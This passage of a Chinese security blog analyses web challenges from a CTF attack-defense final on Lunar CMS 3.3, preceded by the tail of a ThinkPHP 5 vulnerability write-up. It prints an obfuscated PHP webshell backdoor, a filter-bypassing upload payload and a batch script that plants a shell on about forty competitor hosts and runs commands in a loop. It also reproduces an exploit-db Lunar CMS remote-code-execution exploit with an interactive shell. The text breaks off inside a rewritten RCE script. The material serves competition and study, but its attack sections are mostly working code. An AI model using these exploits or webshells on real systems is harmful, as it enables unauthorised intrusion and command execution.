<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$url</span> = str_replace(<span class="string">'|'</span>, <span class="string">'/'</span>, <span class="symbol">$url</span>);</span><br></pre></td></tr></table></figure>
<p>所以payload中的’/’也可以利用’|’进行替换。该漏洞的利用方法不唯一，针对Thinkphp5.*的不同版本可以寻找不同的类进行调用。</p>
<p><strong>漏洞分析仅用于学习！！！一切实际攻击利用行为概不负责。</strong></p>
]]></content>
      <categories>
        <category>Cyc1e的漏洞分析之路</category>
      </categories>
      <tags>
        <tag>CVE</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>鹏城杯决赛-web源码分析&amp;稳定自动化上分之路</title>
    <url>/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>赛后听说是决赛平台属于第一次使用，不知道是否有测试过，反正个人体验不是太好，不过第一次使用来讲，应该还算不错，还有很大发展空间嘛。主要写两个php站的源码分析， 第一个web是 <a href="https://pan.baidu.com/s/1RfyJxhATIkFnl1rFulaslA" target="_blank" rel="noopener">Lunar CMS 3.3</a> 提取码: qqmg，第二个是 <a href="https://pan.baidu.com/s/14HwIUINbsX88ty0su3NPcA" target="_blank" rel="noopener">Woredpress 4.9</a> 提取码: xwqh</p>
<h2 id="1-Lunar-CMS-源码分析"><a href="#1-Lunar-CMS-源码分析" class="headerlink" title="1. Lunar CMS 源码分析"></a>1. Lunar CMS 源码分析</h2><p>拿到攻防赛源码一般先甩查杀软件查杀一番，然后用对应版本源码Diff一下，这样这可很快分析出代码哪些地方有修改过（一般修改过的地方就是预设的漏洞了），否则那就是直接用版本CVE打了。源码在比赛平台爆炸之前拿到的，半个小时写好了三个洞的Exp，本以为稳如老狗，没想到平台恢复时不提前说一声，本菜还在红警中，等退出红警，都被神仙提权了。</p>
<h3 id="0x01-变形后门"><a href="#0x01-变形后门" class="headerlink" title="0x01 变形后门"></a>0x01 变形后门</h3><p>甩 Webshellkill 查杀一番，本菜的Webshellkill行为库是20181129的，怎么说还是蛮新的</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-aab0c421151d43ed.png" alt></p>
<p>Webshellkill 检测出的可疑文件是原版中自带的代码文件，所以先不管这个文件，用Diff工具对题目源码和LunarCMS 3.3左右的版本的源码进行对比。</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-e80052c26ae90e19.png" alt></p>
<p>在admin目录下多了一个tool.php文件，看代码很明显一个预留的后面，竟然还过了Webshellkill的查杀，果断收集一只免杀马。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#tool.php：</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Variable</span><span class="params">($c)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $name = <span class="string">'Bar'</span>;</span><br><span class="line">        $b=<span class="keyword">$this</span>-&gt;$name(); <span class="comment">// This calls the Bar() method</span></span><br><span class="line">        $b($c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Bar</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	$__=<span class="string">'a'</span>;</span><br><span class="line">        $a1=$__; </span><br><span class="line">		$__++;$__++;$__++;$__++;</span><br><span class="line">		$a2=$__; </span><br><span class="line">		$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class="line">		$a3=$__++; </span><br><span class="line">		$a4=$__++; </span><br><span class="line">		$a5=$__; </span><br><span class="line">		$a=$a1.$a4.$a4.$a2.$a3.$a5; </span><br><span class="line">        <span class="keyword">return</span> $a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">variable</span><span class="params">()</span></span>&#123;</span><br><span class="line">	$_=<span class="string">'A'</span>;</span><br><span class="line">	$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;</span><br><span class="line">	$b1=$_++; </span><br><span class="line">	$b2=$_; </span><br><span class="line">	$_++;$_++;$_++;</span><br><span class="line">	$b3=$_++; </span><br><span class="line">	$b4=$_; </span><br><span class="line">	$b=<span class="string">'_'</span>.$b2.$b1.$b3.$b4; </span><br><span class="line">	<span class="keyword">return</span> $b;</span><br><span class="line">&#125;</span><br><span class="line">$foo = <span class="keyword">new</span> Foo();</span><br><span class="line">$funcname = <span class="string">"Variable"</span>;</span><br><span class="line">$bb=$&#123;variable()&#125;[variable()];</span><br><span class="line">$foo-&gt;$funcname($bb);</span><br></pre></td></tr></table></figure>
<p>静态调试下后门代码，分别把$a和$b给打印出来</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-d44013bfed92bdef.png" alt></p>
<p>所以拼接起来也就是一个简单的一句话木马，就不贴Exp了</p>
<figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line"><span class="built_in">assert</span>($<span class="variable">_POST</span>[<span class="variable">_POST</span>])</span><br></pre></td></tr></table></figure>



<h3 id="0x02-预设的任意文件上传"><a href="#0x02-预设的任意文件上传" class="headerlink" title="0x02 预设的任意文件上传"></a>0x02 预设的任意文件上传</h3><p>写好后门利用的Exp脚本后，继续Diff文件，在admin目录下多了一个certificate文件夹</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-2e96eaed0531ec46.png" alt></p>
<p>本以为这是一个插件什么的，查看代码发现是一个任意文件上传点，做了点点过滤</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">#index.php</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php">        highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"./bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./jquery.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      $(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#selectFile'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; $(<span class="string">'#file'</span>).trigger(<span class="string">'click'</span>) &#125;);</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#file'</span>).change(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; $(<span class="string">'#selectedFile'</span>).val($(<span class="keyword">this</span>).val()) &#125;);</span></span><br><span class="line">      &#125;);</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-lg-12"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h1</span>&gt;</span>文件上传<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">class</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span> <span class="attr">style</span>=<span class="string">"display: none;"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-group"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"selectedFile"</span> <span class="attr">readonly</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"input-group-btn"</span> <span class="attr">style</span>=<span class="string">"width:200px"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"selectFile"</span> <span class="attr">class</span>=<span class="string">"btn btn-defdault"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">style</span>=<span class="string">"margin-right:5px;"</span>&gt;</span>选择文件<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"upload"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">          <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">  <span class="keyword">if</span>($_SERVER[<span class="string">"REQUEST_METHOD"</span>] === <span class="string">"POST"</span>) :</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (is_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>])):</span></span><br><span class="line"><span class="php">      $file = $_FILES[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php">      $name = $file[<span class="string">'name'</span>];</span></span><br><span class="line"><span class="php">      <span class="keyword">if</span> (preg_match(<span class="string">"/^[a-zA-Z0-9]+\\.[a-zA-Z0-9]+$/"</span>, $name) ):</span></span><br><span class="line"><span class="php">        $data = file_get_contents($file[<span class="string">'tmp_name'</span>]);</span></span><br><span class="line"><span class="php">        <span class="keyword">while</span>($next = preg_replace(<span class="string">"/&lt;\\?/"</span>, <span class="string">""</span>, $data))&#123;</span></span><br><span class="line"><span class="php">          $next = preg_replace(<span class="string">"/php/"</span>, <span class="string">""</span>, $next);</span></span><br><span class="line"><span class="php">          <span class="keyword">if</span>($data === $next) &#123;</span></span><br><span class="line"><span class="php">			  <span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">		  &#125;</span></span><br><span class="line"><span class="php">		  source();</span></span><br><span class="line"><span class="php">          $data = $next;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        file_put_contents(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/u/'</span> . $name, $data);</span></span><br><span class="line"><span class="php">        chmod(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/u/'</span> . $name, <span class="number">0644</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&lt;?php echo htmlspecialchars("</span><span class="attr">u</span>/" <span class="attr">.</span> $<span class="attr">name</span>)?&gt;</span>"&gt;上传成功!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">      <span class="keyword">endif</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">endif</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">  <span class="keyword">endif</span>;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>分析主体代码，这个上传点写得比较简单</p>
<p><img src="/2018/12/10/%E9%B9%8F%E5%9F%8E%E6%9D%AF%E5%86%B3%E8%B5%9B-web%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-%E7%A8%B3%E5%AE%9A%E8%87%AA%E5%8A%A8%E5%8C%96%E4%B8%8A%E5%88%86%E4%B9%8B%E8%B7%AF/8418106-43d2cca6660c725e.png" alt></p>
<p>上传没有对文件后缀进行校验，所以可以直接上传php文件，对上传文件内容进行了校验，只校验了’ &lt;? ‘和’ php ‘,并且对 php 校验没有使用 /i ,也就是只校验小写的 php ,所以利用 pHp,就可以直接绕过，而对于’ &lt;? ‘绕过的方式也特别多，比如利用’ &lt;= ‘ 或者用</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'pHp'</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[Cyc1e])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>便可以绕过检测，上传木马利用，所以可以写批量攻击的Exp</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Exp_upload.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: Administrator</span></span><br><span class="line"><span class="comment"># @Date:   2018-12-07 16:17:39</span></span><br><span class="line"><span class="comment"># @Last Modified by:   Cyc1e</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2018-12-07 23:26:08</span></span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line"></span><br><span class="line">def submit_cookie(answer):</span><br><span class="line">    #test = <span class="string">"gongfan_flag\&#123;10848bd4d2318970279b6c124866bcdc5a04ca50eaaaf92c6cf0021754ae43e6\&#125;"</span></span><br><span class="line">    submit_ip = <span class="string">'172.91.1.12:9090'</span></span><br><span class="line">    <span class="attribute">urls</span>=<span class="string">'http://%s/ad/hacker/submit/submitCode'</span>% submit_ip</span><br><span class="line">    post = &#123;<span class="string">'flag'</span>:answer&#125;</span><br><span class="line">    <span class="string">''</span><span class="string">'cmder = '</span> %s -b <span class="string">"JSESSIONID=C64DD133EFDDB22CE5BE4CA3991AB6DF"</span> -d <span class="string">"flag=%s"</span><span class="string">'% (urls,answer)</span></span><br><span class="line"><span class="string">                #print cmd</span></span><br><span class="line"><span class="string">                os.system('</span>curl <span class="string">' + cmder)'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">    header = &#123;<span class="string">'Host'</span>: <span class="string">'172.91.1.12:9090'</span>,</span><br><span class="line">			  <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</span><br><span class="line">			  <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">			  <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">			  <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">			  <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">			  <span class="string">'Referer'</span>: <span class="string">'http://172.91.1.12:9090/arace/index'</span>,</span><br><span class="line">			  <span class="string">'Content-Length'</span>: <span class="string">'14'</span>,</span><br><span class="line">			  <span class="string">'Cookie'</span>: <span class="string">'JSESSIONID=51EF0ADB25F425E2BE7C5871C29B1D7A'</span>&#125;</span><br><span class="line">    req = requests.post(urls,headers = header,<span class="attribute">data</span>=post)</span><br><span class="line">    <span class="builtin-name">print</span> req.content</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'errorInfo'</span> <span class="keyword">not</span> <span class="keyword">in</span> req.content:</span><br><span class="line">    	<span class="builtin-name">print</span> <span class="string">' '</span> + req.content</span><br><span class="line"></span><br><span class="line">files = &#123;<span class="string">'file'</span>: open(<span class="string">'pm.php'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line">lists = &#123;<span class="string">'172.91.0.101'</span>,<span class="string">'172.91.0.104'</span>,<span class="string">'172.91.0.106'</span>,<span class="string">'172.91.0.112'</span>,<span class="string">'172.91.0.115'</span>,<span class="string">'172.91.0.116'</span>,<span class="string">'172.91.0.122'</span>,<span class="string">'172.91.0.125'</span>,<span class="string">'172.91.0.135'</span>,<span class="string">'172.91.0.138'</span>,<span class="string">'172.91.0.144'</span>,<span class="string">'172.91.0.18'</span>,<span class="string">'172.91.0.33'</span>,<span class="string">'172.91.0.34'</span>,<span class="string">'172.91.0.35'</span>,<span class="string">'172.91.0.42'</span>,<span class="string">'172.91.0.44'</span>,<span class="string">'172.91.0.45'</span>,<span class="string">'172.91.0.47'</span>,<span class="string">'172.91.0.51'</span>,<span class="string">'172.91.0.53'</span>,<span class="string">'172.91.0.54'</span>,<span class="string">'172.91.0.59'</span>,<span class="string">'172.91.0.60'</span>,<span class="string">'172.91.0.61'</span>,<span class="string">'172.91.0.62'</span>,<span class="string">'172.91.0.64'</span>,<span class="string">'172.91.0.68'</span>,<span class="string">'172.91.0.69'</span>,<span class="string">'172.91.0.70'</span>,<span class="string">'172.91.0.78'</span>,<span class="string">'172.91.0.82'</span>,<span class="string">'172.91.0.87'</span>,<span class="string">'172.91.0.88'</span>,<span class="string">'172.91.0.91'</span>,<span class="string">'172.91.0.92'</span>,<span class="string">'172.91.0.93'</span>,<span class="string">'172.91.0.94'</span>,<span class="string">'172.91.0.97'</span>,<span class="string">'172.91.0.99'</span>&#125;</span><br><span class="line">cmd = <span class="string">'cat /flag/flag.txt'</span></span><br><span class="line"><span class="comment">#cmd = 'dir'</span></span><br><span class="line"><span class="comment">#submit_cookie(111,'asdadasd')</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	<span class="keyword">for</span><span class="built_in"> ip </span><span class="keyword">in</span> lists:</span><br><span class="line">		#ip = <span class="string">'127.0.0.1/pcb/html/'</span></span><br><span class="line">		<span class="builtin-name">print</span> ip</span><br><span class="line">		url = <span class="string">'http://%s:8080/admin/certificate/index.php'</span>% ip</span><br><span class="line">		url1 = <span class="string">'http://%s:8080/admin/certificate/u/pm.php'</span>% ip</span><br><span class="line">		#shell_data = &#123;<span class="string">'pass'</span>:<span class="string">'BOI_youcanyoujump'</span>,<span class="string">'shy'</span>:<span class="string">'system("'</span> + cmd + <span class="string">'");'</span>&#125;</span><br><span class="line">		shell_data = &#123;<span class="string">'Cyc1e'</span>:<span class="string">'system("'</span> + cmd + <span class="string">'");'</span>&#125;</span><br><span class="line">		try:</span><br><span class="line">			req2 = requests.<span class="builtin-name">get</span>(url1,<span class="attribute">timeout</span>=0.5)</span><br><span class="line">			<span class="keyword">if</span> req2.status_code != 200:</span><br><span class="line">				req = requests.post(url = url,files = files,<span class="attribute">timeout</span>=0.5)</span><br><span class="line">			req3 = requests.<span class="builtin-name">get</span>(url1,<span class="attribute">timeout</span>=0.5)</span><br><span class="line">			<span class="keyword">if</span> req3.status_code == 200:</span><br><span class="line">				<span class="builtin-name">print</span> url1</span><br><span class="line">				req1 = requests.post(url = url1,data = shell_data,<span class="attribute">timeout</span>=0.5)</span><br><span class="line">				<span class="builtin-name">print</span> req1.content</span><br><span class="line">			#submit_cookie(req1.content)</span><br><span class="line">		except:</span><br><span class="line">			sleep(0.5)</span><br><span class="line">	sleep(60)</span><br></pre></td></tr></table></figure>
<p>pm.php <code>&lt;script language=&#39;pHp&#39;&gt;eval($_POST[Cyc1e])&lt;/script&gt;</code></p>
<h3 id="0x03-版本-RCE-漏洞利用"><a href="#0x03-版本-RCE-漏洞利用" class="headerlink" title="0x03 版本 RCE 漏洞利用"></a>0x03 版本 RCE 漏洞利用</h3><p>继续Diff文件发现并没有添加其他的异常代码和文件，所以Diff也就只可以发现这两个利用点，那么接下来要找的就是 Lunar CMS 3.3 版本是否存在版本漏洞，而3.3版本恰好存在一个RCE利用点，参考文章：<a href="https://www.exploit-db.com/exploits/33867，文章里的有写好的EXP" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/33867，文章里的有写好的EXP</a></p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#......</span><br><span class="line">#</span><br><span class="line"># Tested on: Apache/<span class="number">2.4</span><span class="number">.7</span> (Win32)</span><br><span class="line">#            PHP/<span class="number">5.5</span><span class="number">.6</span></span><br><span class="line">#            MySQL <span class="number">5.6</span><span class="number">.14</span></span><br><span class="line">#......</span><br><span class="line">import cookielib, urllib</span><br><span class="line">import urllib2, sys, <span class="built_in">os</span></span><br><span class="line"></span><br><span class="line">piton = <span class="built_in">os</span>.<span class="built_in">path</span>.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">'\n\x20\x20[*] Usage: '</span>+piton+<span class="string">' &lt;hostname&gt; &lt;path&gt; &lt;filename.php&gt;\n'</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">'\x20\x20[*] Example: '</span>+piton+<span class="string">' zeroscience.mk lunarcms backdoor.php\n'</span></span><br><span class="line">	sys.<span class="built_in">exit</span>()</span><br><span class="line"></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">path</span> = sys.argv[<span class="number">2</span>]</span><br><span class="line">fname = sys.argv[<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">cj = cookielib.CookieJar()</span><br><span class="line">opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))</span><br><span class="line"></span><br><span class="line"><span class="built_in">create</span> = opener.<span class="built_in">open</span>(<span class="string">'http://'</span>+host+<span class="string">'/'</span>+<span class="built_in">path</span>+<span class="string">'/admin/includes/elfinder/php/connector.php?cmd=mkfile&amp;name='</span>+fname+<span class="string">'&amp;target=l1_XA'</span>)</span><br><span class="line">#<span class="built_in">print</span> <span class="built_in">create</span>.<span class="built_in">read</span>()</span><br><span class="line"></span><br><span class="line">payload = urllib.urlencode(&#123;</span><br><span class="line">							<span class="string">'cmd'</span> : <span class="string">'put'</span>,</span><br><span class="line">							<span class="string">'target'</span> : <span class="string">'l1_'</span>+fname.encode(<span class="string">'base64'</span>,<span class="string">'strict'</span>),</span><br><span class="line">							<span class="string">'content'</span> : <span class="string">'&lt;?php passthru($_GET[\'cmd\']); ?&gt;'</span></span><br><span class="line">							&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">write</span> = opener.<span class="built_in">open</span>(<span class="string">'http://'</span>+host+<span class="string">'/'</span>+<span class="built_in">path</span>+<span class="string">'/admin/includes/elfinder/php/connector.php'</span>, payload)</span><br><span class="line">#<span class="built_in">print</span> <span class="built_in">write</span>.<span class="built_in">read</span>()</span><br><span class="line"><span class="built_in">print</span> <span class="string">'\n'</span></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">	try:</span><br><span class="line">		cmd = raw_input(<span class="string">'shell@'</span>+host+<span class="string">':~# '</span>)</span><br><span class="line"></span><br><span class="line">		<span class="built_in">execute</span> = opener.<span class="built_in">open</span>(<span class="string">'http://'</span>+host+<span class="string">'/'</span>+<span class="built_in">path</span>+<span class="string">'/files/'</span>+fname+<span class="string">'?cmd='</span>+urllib.quote(cmd))</span><br><span class="line">		<span class="built_in">reverse</span> = <span class="built_in">execute</span>.<span class="built_in">read</span>()</span><br><span class="line">		<span class="built_in">print</span> <span class="built_in">reverse</span>;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> cmd.strip() == <span class="string">'exit'</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">	except Exception:</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sys.<span class="built_in">exit</span>()</span><br></pre></td></tr></table></figure>
<p>对php环境有所要求，在 php/5.5.6一下版本是测试成功的，不过刚好，服务器的php环境是可以利用该漏洞的，对于攻防赛而言，需要将脚本进行修改，利用requests库进行重写 </p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Exp_RCE.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line"><span class="keyword">from</span> time import sleep</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def submit_cookie(answer):</span><br><span class="line">    #test = <span class="string">"gongfan_flag\&#123;10848bd4d2318970279b6c124866bcdc5a04ca50eaaaf92c6cf0021754ae43e6\&#125;"</span></span><br><span class="line">    submit_ip = <span class="string">'172.91.1.12:9090'</span></span><br><span class="line">    <span class="attribute">urls</span>=<span class="string">'http://%s/ad/hacker/submit/submitCode'</span>% submit_ip</span><br><span class="line">    post = &#123;<span class="string">'flag'</span>:answer&#125;</span><br><span class="line">    <span class="string">''</span><span class="string">'cmder = '</span> %s -b <span class="string">"JSESSIONID=C64DD133EFDDB22CE5BE4CA3991AB6DF"</span> -d <span class="string">"flag=%s"</span><span class="string">'% (urls,answer)</span></span><br><span class="line"><span class="string">                #print cmd</span></span><br><span class="line"><span class="string">                os.system('</span>curl <span class="string">' + cmder)'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line">    header = &#123;<span class="string">'Host'</span>: <span class="string">'172.91.1.12:9090'</span>,</span><br><span class="line">			  <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</span><br><span class="line">			  <span class="string">'Accept'</span>: <span class="string">'application/json, text/javascript, */*; q=0.01'</span>,</span><br><span class="line">			  <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</span><br><span class="line">			  <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded; charset=UTF-8'</span>,</span><br><span class="line">			  <span class="string">'X-Requested-With'</span>: <span class="string">'XMLHttpRequest'</span>,</span><br><span class="line">			  <span class="string">'Referer'</span>: <span 